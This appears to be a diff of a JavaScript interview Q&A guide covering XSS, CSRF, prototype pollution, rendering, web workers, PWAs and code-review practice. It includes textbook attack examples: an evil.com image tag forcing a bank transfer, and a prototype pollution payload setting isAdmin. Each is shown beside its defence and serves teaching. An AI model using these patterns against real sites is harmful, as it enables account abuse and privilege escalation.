-
-// ── React\'s built-in XSS protection ──────────────────────────────────────────
-// React\'s JSX escapes all values before rendering — textContent equivalent
-function UserGreeting({ name }) {
-  return <h1>Hello, {name}!</h1>; // ✅ safe — JSX escapes {name}
-}
-
-// ❌ DANGEROUS: dangerouslySetInnerHTML bypasses React\'s protection
-function RichContent({ html }) {
-  return <div dangerouslySetInnerHTML={{ __html: html }} />; // ONLY safe with DOMPurify
-}
-
-// ✅ CORRECT usage
-function SafeRichContent({ html }) {
-  return (
-    <div
-      dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }}
-    />
-  );
-}
 ```
 
 **Content Security Policy example (most impactful single mitigation):**
@@ -14069,19 +14448,16 @@ Content-Security-Policy:
   frame-ancestors 'none';
 ```
 
-**Real-World Use Case:**
-
-GitHub\'s XSS history is instructive: despite extensive escaping, a DOM-based XSS was discovered in 2013 via a Markdown renderer that allowed crafted image URLs to execute scripts. GitHub\'s response was to tighten their CSP to disallow inline scripts entirely and implement strict `script-src` restrictions. Today, GitHub uses a nonce-based CSP on every page load, combined with Trusted Types, meaning even if a future XSS injection vector is discovered, the browser will refuse to execute injected scripts because they lack the server-generated nonce.
-
 <div align="right">
     <b><a href="#table-of-contents">↥ back to top</a></b>
 </div>
 
 ## Q. What is CSRF, how does it differ from XSS, and how do you prevent it?
 
-**CSRF (Cross-Site Request Forgery)** tricks a victim\'s browser into sending an authenticated request to a target site without the victim\'s knowledge. Unlike XSS (which executes code *on* the target site), CSRF abuses the browser\'s automatic cookie-sending behaviour — the browser attaches cookies to every request to the matching domain, regardless of which page initiated the request.
+**Cross-Site Request Forgery (CSRF)** is an attack that forces an authenticated user to execute unwanted actions on a web application where they are currently logged in. The attacker tricks the victim\'s browser into making a malicious request to the target site, leveraging the session cookies automatically sent by the browser
 
 **Attack flow:**
+
 1. Victim is logged into `bank.example.com` (session cookie set).
 2. Victim visits `evil.com`, which contains `<img src="https://bank.example.com/transfer?to=attacker&amount=1000">`.
 3. Browser sends a GET request to `bank.example.com` with the victim\'s session cookie — the bank processes the transfer.
@@ -14096,8 +14472,12 @@ GitHub\'s XSS history is instructive: despite extensive escaping, a DOM-based XS
 | **Custom Request Header** | API requires `X-Requested-With: XMLHttpRequest`; CORS blocks cross-origin custom headers | Effective for AJAX APIs |
 | **Origin / Referer validation** | Server checks `Origin` header matches its own domain | Defence-in-depth |
 
+**Example 01:**
+
 ```js
-// ── CSRF token pattern (server renders token into page) ──────────────────────
+/**
+ * CSRF Token Pattern 
+ */
 
 // Server (Express): generate and store token in session
 app.use((req, res, next) => {
@@ -14134,13 +14514,27 @@ async function transfer(to, amount) {
   });
   return res.json();
 }
+```
 
-// ── SameSite cookie — server sets header ─────────────────────────────────────
+**Example 02:**
+
+```js
+/**
+ * SameSite cookie — server sets header 
+ */
+
 // Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict; Path=/
 // With SameSite=Strict, cookie is NEVER sent on cross-site requests
 // With SameSite=Lax (default), cookie is only sent on top-level navigations (GET)
+```
 
-// ── JWT in Authorization header (CSRF-immune by design) ──────────────────────
+**Example 03:**
+
+```js
+/**
+ * JWT in Authorization header (CSRF-immune by design) 
+ */
+
 // If auth is via Authorization: Bearer <token> header (not cookie),
 // CSRF is impossible — cross-origin forms/images cannot set custom headers
 async function apiCall(endpoint, data) {
@@ -14156,27 +14550,28 @@ async function apiCall(endpoint, data) {
 }
 ```
 
-**Real-World Use Case:**
-
-The Django framework generates a CSRF token per session and requires it (via `csrf_token` template tag) in every `POST`, `PUT`, `PATCH`, `DELETE` form. It also sets the `csrftoken` cookie with `SameSite=Lax` by default. Rails does the same with `protect_from_forgery`. Modern SPAs that use `Authorization: Bearer` headers for API calls are inherently CSRF-immune for those calls — which is one reason the JWT-in-memory + Authorization-header pattern is preferred over session cookies for SPA authentication in high-security applications.
-
 <div align="right">
     <b><a href="#table-of-contents">↥ back to top</a></b>
 </div>
 
 ## Q. What is prototype pollution, how is it exploited, and how do you defend against it?
 
-**Prototype pollution** is a JavaScript-specific vulnerability where an attacker injects properties into `Object.prototype` — the root prototype shared by all plain objects. Since every object inherits from `Object.prototype`, polluting it affects every object in the application, enabling unexpected behaviour, privilege escalation, and in some cases Remote Code Execution (RCE).
+**Prototype Pollution** is a JavaScript-specific vulnerability that occurs when an attacker manipulates the built-in `Object.prototype`, allowing them to inject properties into almost all objects in the runtime environment. Because JavaScript objects inherit properties from their prototype chain, modifying the global root prototype immediately pollutes every object created afterward.
 
 **Attack vector:** Functions that recursively merge or clone objects (common in utility libraries like `lodash.merge`, `$.extend`, `JSON.parse` + assign) may process attacker-controlled keys like `__proto__`, `constructor`, or `prototype`.
 
+**Example 01:**
+
 ```js
-// ── Classic attack via deep merge ─────────────────────────────────────────────
+/**
+ * Classic attack via deep merge 
+ */
+
 function deepMerge(target, source) {
   for (const key of Object.keys(source)) {
     if (typeof source[key] === 'object' && source[key] !== null) {
       target[key] ??= {};
-      deepMerge(target[key], source[key]); // ❌ no key sanitisation
+      deepMerge(target[key], source[key]); //  no key sanitisation
     } else {
       target[key] = source[key];
     }
@@ -14190,19 +14585,26 @@ deepMerge({}, maliciousPayload);
 
 // Now ALL plain objects have isAdmin = true
 const user = {};
-console.log(user.isAdmin); // true — POLLUTION ⚠️
+console.log(user.isAdmin); // true — POLLUTION 
 
 // Application code that trusted this:
 if (user.isAdmin) grantAdminAccess(); // bypassed!
 
-// ── Defences ──────────────────────────────────────────────────────────────────
+```
 
-// 1. Key sanitisation in merge functions
+**Example 02:** Key sanitisation in merge functions
+
+```js
+/**
+ * Defences - Key sanitisation in merge functions
+ */
+
+// Key sanitisation in merge functions
 function safeMerge(target, source) {
   for (const key of Object.keys(source)) {
     // Block dangerous keys
     if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
-      continue; // ✅ skip
+      continue; //  skip
     }
     if (typeof source[key] === 'object' && source[key] !== null) {
       target[key] ??= {};
@@ -14213,20 +14615,45 @@ function safeMerge(target, source) {
   }
   return target;
 }
+```
 
-// 2. Use Object.create(null) for data dictionaries (no prototype chain)
+**Example 03:** Use `Object.create(null)`
+
+```js
+/**
+ * Defences - Use Object.create(null) for data dictionaries (no prototype chain)
+ */
+
 const safeMap = Object.create(null);
 safeMap['__proto__'] = 'harmless'; // just a regular property — no prototype effect
-console.log(({}).polluted); // undefined ✅ — Object.prototype not affected
+console.log(({}).polluted); // undefined  — Object.prototype not affected
+```
 
-// 3. Use Map instead of plain objects for dynamic key storage
+**Example 04:** Use `Map` instead of plain objects for dynamic key storage
+
+```js
+/**
+ * Defences - Use Map instead of plain objects for dynamic key storage
+ */
+
 const config = new Map();
 config.set('__proto__', 'value'); // stored as a Map entry, not prototype mutation
+```
 
-// 4. Freeze Object.prototype (nuclear option — may break libraries)
+**Example 05:** Use Freeze `Object.prototype`
+
+```js
+/**
+ * Defences - Freeze Object.prototype (nuclear option — may break libraries)
+ */
+
 Object.freeze(Object.prototype);
+```
 
-// 5. JSON schema validation — reject payloads with dangerous keys before processing
+**Example 06:** JSON schema validation
+
+```js
+// JSON schema validation — reject payloads with dangerous keys before processing
 import Ajv from 'ajv';
 const ajv = new Ajv();
 const schema = {
@@ -14244,10 +14671,6 @@ const validate = ajv.compile(schema);
 if (!validate(userInput)) throw new Error('Invalid input');
 ```
 
-**Real-World Use Case:**
-
-CVE-2019-10744 was a critical prototype pollution vulnerability in Lodash\'s `_.defaultsDeep`, `_.merge`, and `_.mergeWith` functions — affecting millions of npm packages that depended on Lodash. An attacker who could control the source of a merge call could inject `isAdmin`, `debug`, or even override `toString`/`valueOf` in ways that caused RCE in server-side template engines. The fix (Lodash 4.17.12) added explicit key blocklist checks for `__proto__`, `prototype`, and `constructor`. This vulnerability demonstrates why sanitising keys in all recursive object-processing functions is a security requirement, not just a defensive nicety.
-
 <div align="right">
     <b><a href="#table-of-contents">↥ back to top</a></b>
 </div>
@@ -14258,7 +14681,9 @@ CVE-2019-10744 was a critical prototype pollution vulnerability in Lodash\'s `_.
 
 ## Q. What is the browser rendering pipeline, and what triggers a reflow vs. a repaint?
 
-The browser converts HTML, CSS, and JavaScript into pixels on screen through a sequence of steps known as the **Critical Rendering Path (CRP)**:
+The **browser rendering pipeline** is the sequential process a browser engine follows to convert HTML, CSS, and JavaScript source code into actual pixels on a physical screen
+
+**The Rendering Pipeline Steps**
 
 ```
 HTML parsing → DOM Tree
@@ -14280,82 +14705,21 @@ CSS parsing  → CSSOM Tree
 **Compositing only:** The cheapest operation — moving or animating a composited layer (using `transform` or `opacity`) without triggering layout or paint.
 
 **What triggers reflow:**
+
 - Reading layout properties: `offsetWidth`, `offsetHeight`, `clientWidth`, `scrollTop`, `getBoundingClientRect()`
 - Modifying DOM structure (insert, delete, move nodes)
 - Changing styles that affect geometry: `width`, `height`, `padding`, `margin`, `border`, `font-size`
 - Window resize
 
 **What triggers repaint only:**
+
 - `color`, `background-color`, `border-color`, `outline`, `box-shadow`, `visibility`
 
 **What triggers compositing only (cheapest):**
+
 - `transform: translate/scale/rotate`
 - `opacity`
 - `will-change: transform`
-
-```js
-// ── Layout thrashing — reading and writing in alternation ─────────────────────
-// ❌ Forces browser to reflow on every iteration (up to 60 reflows for 60 items)
-const items = document.querySelectorAll('.item');
-items.forEach(item => {
-  const width = item.offsetWidth; // READ — forces reflow to get current value
-  item.style.width = (width * 1.1) + 'px'; // WRITE — invalidates layout
-  // Next iteration: READ again — must reflow to get updated value → thrashing
-});
-
-// ✅ Batch reads first, then writes — one reflow total
-const widths = Array.from(items).map(item => item.offsetWidth); // all reads
-items.forEach((item, i) => {
-  item.style.width = (widths[i] * 1.1) + 'px'; // all writes
-});
-
-// ── requestAnimationFrame for visual updates ──────────────────────────────────
-// ✅ Reads before rAF, writes inside rAF — aligned with browser paint cycle
-let pendingUpdate = false;
-
-function scheduleUpdate() {
-  if (pendingUpdate) return;
-  pendingUpdate = true;
-  requestAnimationFrame(() => {
-    // Perform DOM writes here — browser will paint after this callback
-    applyDOMUpdates();
-    pendingUpdate = false;
-  });
-}
-
-// ── Compositing-only animations — use transform, not top/left ─────────────────
-// ❌ Causes reflow on every frame (top/left change geometry)
-element.style.top  = `${newY}px`;
-element.style.left = `${newX}px`;
-
-// ✅ GPU composited — no reflow, no repaint
-element.style.transform = `translate(${newX}px, ${newY}px)`;
-
-// ── will-change hint — promotes to own compositor layer ──────────────────────
-// Use sparingly — each layer consumes GPU memory
-const modal = document.querySelector('.modal');
-// Before animation starts:
-modal.style.willChange = 'transform, opacity';
-// After animation ends (important — remove to free GPU memory):
-modal.addEventListener('transitionend', () => {
-  modal.style.willChange = 'auto';
-}, { once: true });
-
-// ── FastDOM library pattern — micro-task batching ────────────────────────────
-// FastDOM queues reads and writes and executes them in batches
-import fastdom from 'fastdom';
-
-fastdom.measure(() => {
-  const h = element.offsetHeight; // read phase
-  fastdom.mutate(() => {
-    element.style.height = (h + 20) + 'px'; // write phase — no thrashing
-  });
-});
-```
-
-**Real-World Use Case:**
-
-Google Maps' JavaScript SDK moves map tiles using `transform: translate3d(x, y, 0)` instead of `top`/`left` positioning — this keeps tile movement on the GPU compositor thread, achieving smooth 60fps panning even while the CPU is busy parsing new tile data. Twitter\'s PWA team found a 50% reduction in jank by auditing all `offsetWidth`/`clientHeight` reads and batching them before DOM writes using `requestAnimationFrame` — measured via the "Layout" track in Chrome DevTools Performance panel.
 
 <div align="right">
     <b><a href="#table-of-contents">↥ back to top</a></b>
@@ -14375,8 +14739,13 @@ The browser\'s **main thread** runs JavaScript, handles layout, style calculatio
 | **Service Worker** | Separate thread | Network interception, caching |
 | **Scheduler API** (`scheduler.postTask`) | Main thread, prioritised | Task yielding to prevent long tasks |
 
+**Example 01:**
+
 ```js
-// ── Web Worker: offload heavy computation ─────────────────────────────────────
+/**
+ * Web Worker: offload heavy computation 
+ */
+
 // worker.js (runs in separate thread — no DOM, no window)
 self.onmessage = function ({ data: { items } }) {
   // Heavy computation — does not block main thread
@@ -14396,8 +14765,15 @@ worker.postMessage({ items: largeDataset }); // send data
 worker.onmessage = ({ data: { result } }) => {
   renderResults(result); // back on main thread — update DOM
 };
+```
 
-// ── OffscreenCanvas: image processing in a worker ─────────────────────────────
+**Example 02:**
+
+```js
+/**
+ * OffscreenCanvas: image processing in a worker 
+ */
+
 // main.js
 const canvas  = document.querySelector('#canvas');
 const offscreen = canvas.transferControlToOffscreen();
@@ -14411,40 +14787,7 @@ self.onmessage = ({ data: { canvas } }) => {
   ctx.filter = 'grayscale(100%)';
   ctx.drawImage(imageBitmap, 0, 0);
 };
-
-// ── scheduler.postTask — yield to higher-priority work ────────────────────────
-async function processLargeList(items) {
-  const CHUNK = 100;
-  const results = [];
-
-  for (let i = 0; i < items.length; i += CHUNK) {
-    const chunk = items.slice(i, i + CHUNK);
-    results.push(...processChunk(chunk));
-
-    // Yield to allow input events and rendering between chunks
-    if ('scheduler' in window) {
-      await scheduler.postTask(() => {}, { priority: 'user-blocking' });
-    } else {
-      await new Promise(resolve => setTimeout(resolve, 0)); // fallback
-    }
-  }
-  return results;
-}
-
-// ── Long Task detection — measure main thread blocking ────────────────────────
-const observer = new PerformanceObserver(list => {
-  list.getEntries().forEach(entry => {
-    if (entry.duration > 50) { // tasks > 50ms block input response
-      console.warn(`Long task: ${entry.duration.toFixed(0)}ms`, entry.attribution);
-    }
-  });
-});
-observer.observe({ entryTypes: ['longtask'] });
 ```
-
-**Real-World Use Case:**
-
-Figma\'s browser-based design tool compiles its rendering engine to WebAssembly and runs it in a Web Worker. All geometry calculations, bezier path operations, and viewport transformations execute off the main thread. The main thread handles only user input events and sends commands to the worker via `postMessage`. This architecture achieves 60fps canvas rendering even for documents with tens of thousands of vector objects — tasks that would be completely impossible on the main thread. Similarly, Google Sheets runs formula calculation in a Web Worker, keeping the spreadsheet UI responsive during long recalculations.
 
 <div align="right">
     <b><a href="#table-of-contents">↥ back to top</a></b>
@@ -14456,22 +14799,25 @@ Figma\'s browser-based design tool compiles its rendering engine to WebAssembly 
 
 ## Q. What is a Progressive Web App (PWA)?
 
-A **Progressive Web App (PWA)** is a web application that uses modern web APIs and progressive enhancement strategies to deliver an app-like experience — including offline support, push notifications, and home-screen installation — directly through a browser, without an app store.
+A **Progressive Web App (PWA)** is a highly optimized website built with modern web technologies that delivers a native-like app experience directly through a web browser. It bridges the gap between the reach of traditional websites and the advanced functionality of platform-specific mobile or desktop applications
+
+It uses modern web APIs and progressive enhancement strategies to deliver an app-like experience — including offline support, push notifications, and home-screen installation — directly through a browser, without an app store.
 
 **Core characteristics:**
 
-| Pillar | Description |
-|--------|-------------|
-| **Reliable** | Loads instantly and works offline via service workers and caching |
-| **Fast** | Responds quickly to user interactions |
-| **Engaging** | Feels like a native app (full-screen, push notifications, home-screen icon) |
+* **Installable**: Users can add the app directly to their device\'s home screen or desktop taskbar straight from the browser, completely bypassing the traditional app stores
 
-**PWA checklist:**
+* **Offline Functionality**: They can load and run smoothly even when the device is completely offline or navigating through unreliable, low-connectivity networks.
 
-* Served over HTTPS
-* Has a valid Web App Manifest
-* Registers a service worker with a fetch handler
-* Responds with a 200 when offline
+* **Cross-Platform**: Developers construct the app using a single, unified codebase (HTML, CSS, JavaScript, and WebAssembly) that adapts flawlessly across Android, iOS, Windows, and macOS.Re-engageable: They support background synchronization and native push notifications to draw users back, exactly like a native app.
+
+**Technical Architecture:**
+
+* **HTTPS Security**: The app must be served over a fully secured connection to protect user data integrity and enable advanced background features.
+
+* **Web App Manifest**: A standalone JSON configuration file that outlines metadata like the app name, launcher icons, theme colors, and full-screen window display settings.
+
+* **Service Workers**: Advanced, client-side JavaScript daemons running quietly in the background. They intercept network requests, manage deep asset caching via the Cache API, and enable instant-load and offline operations.
 
 <div align="right">
     <b><a href="#table-of-contents">↥ back to top</a></b>
@@ -14479,26 +14825,26 @@ A **Progressive Web App (PWA)** is a web application that uses modern web APIs a
 
 ## Q. What is a Web App Manifest?
 
-The **Web App Manifest** (`manifest.json`) is a JSON file that tells the browser how to install the app on a device\'s home screen and how it should appear when launched.
+A **Web App Manifest** is a JSON configuration file that provides essential metadata about a web application to the browser, allowing it to be installed and behave exactly like a native app on desktop and mobile operating systems. It is a foundational requirement for building **Progressive Web Apps (PWAs)**.
 
-**`manifest.json`:**
+**Example: `manifest.json`**
 
 ```json
 {
-  "name": "My Awesome App",
-  "short_name": "MyApp",
-  "description": "A sample PWA",
-  "start_url": "/",
+  "id": "/chat-app",
+  "name": "ChatMessenger Lite",
+  "short_name": "Chat",
+  "start_url": "/index.html",
+  "scope": "/",
   "display": "standalone",
   "background_color": "#ffffff",
-  "theme_color": "#317EFB",
-  "orientation": "portrait",
+  "theme_color": "#0078d4",
+  "description": "A lightweight and secure messaging platform.",
   "icons": [
     {
       "src": "/icons/icon-192.png",
       "sizes": "192x192",
-      "type": "image/png",
-      "purpose": "any maskable"
+      "type": "image/png"
     },
     {
       "src": "/icons/icon-512.png",
@@ -14531,7 +14877,7 @@ The **Web App Manifest** (`manifest.json`) is a JSON file that tells the browser
 
 ## Q. What are service workers and caching strategies in PWA?
 
-A **service worker** is a JavaScript file that runs in a separate worker thread, acting as a network proxy between the web app and the network. It enables offline support, background processing, and push notifications.
+A **service worker** is a event-driven JavaScript file that runs in a separate worker thread, acting as a network proxy between the web app and the network. It enables offline support, background processing, and push notifications.
 
 **Registering a service worker:**
 
@@ -14592,11 +14938,15 @@ self.addEventListener('fetch',    e => { /* intercept requests */ });
 
 ## Q. What is Background Sync in PWA?
 
-**Background Sync** allows a PWA to defer actions until the user has a stable network connection. For example, if a user submits a form while offline, the sync can be retried automatically when connectivity is restored — even if the app is no longer open.
+**Background Sync** is a Progressive Web App (PWA) capability that lets web applications defer network tasks when a device is offline so they can automatically execute as soon as a stable internet connection returns. For example, if a user submits a form while offline, the sync can be retried automatically when connectivity is restored — even if the app is no longer open.
 
-**How to use Background Sync:**
+**Example:**
 
 ```js
+/**
+ * Background Sync in PWA
+ */
+
 // 1. Register a sync tag when the action is queued
 async function saveData(data) {
   await storeInIndexedDB(data); // persist locally first
@@ -15114,13 +15464,13 @@ As a tech lead reviewing JavaScript PRs, you are looking beyond syntax — you a
 
 ```js
 // ── Anti-pattern 1: Mutating props / shared state ────────────────────────────
-// ❌ Code review flag: direct mutation of function argument
+//  Code review flag: direct mutation of function argument
 function processCart(cart) {
   cart.items.push(newItem);   // mutates caller\'s object
   cart.total += newItem.price;
   return cart;
 }
-// ✅ Return new object
+//  Return new object
 function processCart(cart) {
   return {
     ...cart,
@@ -15130,12 +15480,12 @@ function processCart(cart) {
 }
 
 // ── Anti-pattern 2: Floating Promise (no await, no .catch) ───────────────────
-// ❌ Flag: missing await — rejection silently discarded
+//  Flag: missing await — rejection silently discarded
 function handleSubmit(data) {
   saveToDatabase(data);       // fire-and-forget — errors invisible
   showSuccessToast();
 }
-// ✅ Await and handle errors
+//  Await and handle errors
 async function handleSubmit(data) {
   try {
     await saveToDatabase(data);
@@ -15146,7 +15496,7 @@ async function handleSubmit(data) {
 }
 
 // ── Anti-pattern 3: N+1 sequential await in loop ─────────────────────────────
-// ❌ Flag: 50 sequential API calls instead of 1 parallel batch
+//  Flag: 50 sequential API calls instead of 1 parallel batch
 async function enrichOrders(orderIds) {
   const orders = [];
   for (const id of orderIds) {
@@ -15154,18 +15504,18 @@ async function enrichOrders(orderIds) {
   }
   return orders;
 }
-// ✅ Parallel
+//  Parallel
 async function enrichOrders(orderIds) {
   return Promise.all(orderIds.map(fetchOrder)); // ~200ms total
 }
 
 // ── Anti-pattern 4: Unchecked external data ──────────────────────────────────
-// ❌ Flag: no validation of JSON.parse result from localStorage
+//  Flag: no validation of JSON.parse result from localStorage
 function loadConfig() {
   const raw = localStorage.getItem('config');
   return JSON.parse(raw);   // throws if null or malformed; no shape validation
 }
-// ✅ Validate at boundary
+//  Validate at boundary
 function loadConfig() {
   try {
     const raw = localStorage.getItem('config');
@@ -15179,12 +15529,12 @@ function loadConfig() {
 }
 
 // ── Anti-pattern 5: Missing cleanup ──────────────────────────────────────────
-// ❌ Flag: listener added but never removed
+//  Flag: listener added but never removed
 useEffect(() => {
   window.addEventListener('resize', handleResize);
   // Missing return () => window.removeEventListener('resize', handleResize);
 }, []);
-// ✅ Cleanup returned
+//  Cleanup returned
 useEffect(() => {
   window.addEventListener('resize', handleResize);
   return () => window.removeEventListener('resize', handleResize);
@@ -15312,7 +15662,7 @@ In a large codebase maintained by multiple teams, inconsistent async patterns �
 ```js
 // ── Team convention: async service layer pattern ──────────────────────────────
 
-// ✅ Canonical pattern: async/await + typed Result object (no thrown errors from services)
+//  Canonical pattern: async/await + typed Result object (no thrown errors from services)
 type Result<T> =
   | { ok: true;  data: T }
   | { ok: false; error: string; code: number };
@@ -15481,14 +15831,14 @@ Slack\'s web frontend uses a multi-layer error strategy: React Error Boundaries 
 **Barrel files** (`index.ts` re-exporting from a directory) are convenient but dangerous: they create implicit dependencies that prevent tree-shaking, cause circular dependency chains, and significantly slow TypeScript compilation at scale.
 
 ```
-// ❌ Type-based (horizontal layers) — tight coupling across features
+//  Type-based (horizontal layers) — tight coupling across features
 src/
   components/  UserCard.tsx, ProductCard.tsx, OrderTable.tsx
   hooks/       useUser.ts, useProducts.ts, useOrders.ts
   services/    userService.ts, productService.ts
   utils/       formatDate.ts, formatCurrency.ts
 
-// ✅ Feature-based (vertical slices) — high cohesion, explicit boundaries
+//  Feature-based (vertical slices) — high cohesion, explicit boundaries
 src/
   features/
     user/
@@ -15517,7 +15867,7 @@ export type { User }   from './user.types';
 // Do NOT re-export userService — it is internal implementation detail
 
 // Consumer
-import { UserCard, useUser } from '@/features/user'; // ✅ imports from barrel
+import { UserCard, useUser } from '@/features/user'; //  imports from barrel
 // Never: import { userService } from '@/features/user/userService'; // internal!
 
 // ── Dependency rules — enforced by ESLint import/no-restricted-paths ─────────
@@ -15575,7 +15925,7 @@ This is one of the most consequential architectural decisions for a frontend pla
 | Dimension | Monorepo | Polyrepo |
 |---|---|---|
 | Code sharing | Trivial — import directly | Requires publishing npm packages |
-| Atomic cross-package changes | ✅ One PR, one commit | ❌ Multiple coordinated PRs |
+| Atomic cross-package changes |  One PR, one commit |  Multiple coordinated PRs |
 | CI complexity | Higher (affected package detection) | Lower per-repo, higher overall |
 | Team autonomy | Lower (shared tooling, shared CI) | Higher |
 | Dependency versioning | Single version per dep (no diamond) | Risk of version mismatches |
@@ -15646,11 +15996,11 @@ Ad-hoc `try/catch` blocks scattered throughout the codebase create inconsistent 
 
 | Error type | Recoverability | User-visible | Example |
 |---|---|---|---|
-| Validation error | ✅ Recoverable | ✅ Yes | Invalid form input |
-| Network/API error | ✅ Recoverable (retry) | ✅ Yes | HTTP 503, timeout |
-| Auth error | ✅ Recoverable (re-auth) | ✅ Yes | HTTP 401 |
-| Business rule error | ✅ Recoverable | ✅ Yes | Insufficient balance |
-| Unexpected/programmer error | ❌ Non-recoverable | ⚠️ Generic | TypeError, RangeError |
+| Validation error |  Recoverable |  Yes | Invalid form input |
+| Network/API error |  Recoverable (retry) |  Yes | HTTP 503, timeout |
+| Auth error |  Recoverable (re-auth) |  Yes | HTTP 401 |
+| Business rule error |  Recoverable |  Yes | Insufficient balance |
+| Unexpected/programmer error |  Non-recoverable |  Generic | TypeError, RangeError |
 
 ```js
 // ── 1. Typed custom error hierarchy ──────────────────────────────────────────
@@ -15791,24 +16141,24 @@ A performance review is a systematic audit across three dimensions: **runtime pe
 
 ```js
 // ── Bundle size: tree-shaking fix ─────────────────────────────────────────────
-// ❌ Imports entire lodash (70 KB gzipped)
+//  Imports entire lodash (70 KB gzipped)
 import _ from 'lodash';
 const result = _.debounce(fn, 300);
 
-// ✅ Import only what you need (< 1 KB)
+//  Import only what you need (< 1 KB)
 import debounce from 'lodash/debounce';
 // Or use native implementation — no dependency at all:
 const debounce = (fn, ms) => { let t; return (...a) => { clearTimeout(t); t = setTimeout(() => fn(...a), ms); }; };
 
 // ── React render audit: unstable references ───────────────────────────────────
-// ❌ Causes ALL child components to re-render on every parent render
+//  Causes ALL child components to re-render on every parent render
 function Parent() {
   const config = { pageSize: 20 };      // new object reference every render
   const onLoad = () => fetchData();     // new function reference every render
   return <DataGrid config={config} onLoad={onLoad} />;
 }
 
-// ✅ Stable references — only re-render children when values actually change
+//  Stable references — only re-render children when values actually change
 const GRID_CONFIG = { pageSize: 20 };    // module-level constant
 function Parent() {
   const onLoad = React.useCallback(() => fetchData(), []);
@@ -15844,10 +16194,10 @@ onTTFB(sendToAnalytics); // Time to First Byte         — target < 800ms
 
 | Fix | Effort | Impact | Do first? |
 |---|---|---|---|
-| Add route-based code splitting | Low | Very High (LCP -40%) | ✅ Yes |
-| Replace lodash with tree-shaken imports | Low | Medium | ✅ Yes |
-| Add `React.memo` + `useCallback` to frequently re-rendering lists | Medium | High | ✅ Yes |
-| Replace `top`/`left` animations with `transform` | Low | High (jank elimination) | ✅ Yes |
+| Add route-based code splitting | Low | Very High (LCP -40%) |  Yes |
+| Replace lodash with tree-shaken imports | Low | Medium |  Yes |
+| Add `React.memo` + `useCallback` to frequently re-rendering lists | Medium | High |  Yes |
+| Replace `top`/`left` animations with `transform` | Low | High (jank elimination) |  Yes |
 | Migrate to streaming SSR | High | Medium | Later |
 | WebAssembly for a single CPU-bound algorithm | Very High | Low | Probably never |
 
@@ -16043,9 +16393,9 @@ export default {
 |---------|---------|--------|--------|
 | Config | Required | Zero-config | Simple |
 | Best for | Apps | Apps (rapid setup) | Libraries |
-| Tree shaking | ✅ | ✅ | ✅ (best) |
-| Code splitting | ✅ | ✅ | ✅ |
-| HMR | ✅ | ✅ built-in | ❌ (via plugin) |
+| Tree shaking | Yes | Yes | Yes (best) |
+| Code splitting | Yes | Yes | Yes |
+| HMR | Yes | Yes built-in | No (via plugin) |
 
 <div align="right">
     <b><a href="#table-of-contents">↥ back to top</a></b>
@@ -16241,8 +16591,8 @@ const ALLOWED_ORIGINS = new Set([
 app.use((req, res, next) => {
   const origin = req.headers.origin;
 
-  // ❌ NEVER: Access-Control-Allow-Origin: * with credentials
-  // ❌ NEVER: Access-Control-Allow-Origin: ${origin} without allowlist check
+  //  NEVER: Access-Control-Allow-Origin: * with credentials
+  //  NEVER: Access-Control-Allow-Origin: ${origin} without allowlist check
 
   if (ALLOWED_ORIGINS.has(origin)) {
     res.setHeader('Access-Control-Allow-Origin',       origin);
@@ -16282,12 +16632,12 @@ npm audit --audit-level=high
 
 ```js
 // ── Secrets: never in client-side JavaScript ───────────────────────────────────
-// ❌ NEVER: API keys, database credentials, signing secrets in frontend bundles
+//  NEVER: API keys, database credentials, signing secrets in frontend bundles
 // They are visible to any user via DevTools > Sources
-const client = new Stripe(process.env.REACT_APP_STRIPE_SECRET_KEY); // ❌
+const client = new Stripe(process.env.REACT_APP_STRIPE_SECRET_KEY); // 
 
-// ✅ Frontend only uses publishable/public keys
-const client = new Stripe(process.env.REACT_APP_STRIPE_PUBLISHABLE_KEY); // ✅
+//  Frontend only uses publishable/public keys
+const client = new Stripe(process.env.REACT_APP_STRIPE_PUBLISHABLE_KEY); // 
 // Secret operations (e.g., capture payment) done server-side only
 
 // ── Additional security headers (Helmet.js in Express) ───────────────────────
@@ -16502,7 +16852,7 @@ document.addEventListener('mfe:cart:add', ({ detail }) => {
 import { useCartStore } from '@company/cart-store';
 
 // ── Normalised state shape for large data collections ───────────────────────────
-// ❌ Denormalised: redundant data, hard to update consistently
+//  Denormalised: redundant data, hard to update consistently
 const state = {
   orders: [
     { id: '1', user: { id: 'u1', name: 'Alice', email: 'alice@example.com' }, items: [...] },
@@ -16511,7 +16861,7 @@ const state = {
   ]
 };
 
-// ✅ Normalised: single source of truth per entity (like a database)
+//  Normalised: single source of truth per entity (like a database)
 const state = {
   users:  { 'u1': { id: 'u1', name: 'Alice', email: 'alice@example.com' } },
   orders: {
@@ -16762,24 +17112,24 @@ XSS is an injection attack where an attacker injects malicious scripts into cont
 **Prevention:**
 
 ```js
-// ❌ Dangerous — directly inserting user input into DOM
+//  Dangerous — directly inserting user input into DOM
 element.innerHTML = userInput;
 document.write(userInput);
 
-// ✅ Safe — use textContent which does NOT parse HTML
+//  Safe — use textContent which does NOT parse HTML
 element.textContent = userInput;
 
-// ✅ Sanitize with a trusted library (DOMPurify)
+//  Sanitize with a trusted library (DOMPurify)
 import DOMPurify from 'dompurify';
 element.innerHTML = DOMPurify.sanitize(userInput);
 
-// ✅ Set Content-Security-Policy header (server-side)
+//  Set Content-Security-Policy header (server-side)
 // Content-Security-Policy: default-src 'self'; script-src 'self'
 
-// ✅ Use HttpOnly cookies — prevents JS from reading sensitive cookies
+//  Use HttpOnly cookies — prevents JS from reading sensitive cookies
 // Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
 
-// ✅ Encode user data before rendering in HTML contexts
+//  Encode user data before rendering in HTML contexts
 function escapeHtml(str) {
   return str
     .replace(/&/g, '&amp;')
@@ -16805,7 +17155,7 @@ CSRF tricks an authenticated user\'s browser into making an unwanted request to 
 **Prevention:**
 
 ```js
-// ✅ 1. CSRF Token — include a secret token in every state-changing request
+//  1. CSRF Token — include a secret token in every state-changing request
 // Server generates a unique token per session and validates it on each request
 
 fetch('/api/transfer', {
@@ -16817,12 +17167,12 @@ fetch('/api/transfer', {
   body: JSON.stringify({ to: 'friend', amount: 100 })
 });
 
-// ✅ 2. SameSite Cookie attribute — prevents cookies from being sent cross-origin
+//  2. SameSite Cookie attribute — prevents cookies from being sent cross-origin
 // Set-Cookie: session=abc; SameSite=Strict; Secure
 
-// ✅ 3. Check the Origin/Referer header on the server
+//  3. Check the Origin/Referer header on the server
 
-// ✅ 4. Use custom request headers — simple AJAX requests don\'t send custom headers
